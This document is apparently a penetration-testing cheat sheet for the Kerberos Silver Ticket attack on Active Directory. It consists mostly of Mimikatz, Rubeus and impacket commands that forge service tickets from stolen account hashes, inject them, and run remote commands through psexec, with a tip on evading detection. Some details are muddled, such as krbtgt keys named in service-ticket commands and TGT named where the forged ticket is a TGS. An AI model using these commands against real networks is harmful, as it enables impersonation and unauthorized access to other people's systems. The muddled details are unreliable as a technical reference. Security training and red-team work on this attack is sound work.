# SilverTicket
- https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket

The Silver Ticket attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on acquiring the NTLM hash of a service account, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, impersonating any user, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.

## Generate the RC4 hash from password
```
> mimikatz.exe
> kerberos::hash /password:MyPassword
```

## Windows
### Mimikatz
```
# To generate the TGS with NTLM
> mimikatz # kerberos::golden /domain:<domain_name> /sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 128 key
> mimikatz # kerberos::golden /domain:<domain_name> /sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
> mimikatz # kerberos::golden /domain:<domain_name> /sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname> 

# Inject TGS with Mimikatz
> mimikatz # kerberos::ptt <ticket_kirbi_file>
```

### Rubeus
```
> .\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

## Remote
```
$ ticketer.py -nthash $NTLM -domain-sid $DOMAIN_SID -domain $DOMAIN <USER>

# To generate the TGS with NTLM
$ python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# To generate the TGS with AES key
$ python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# Set the ticket for impacket use
$ export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
$ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

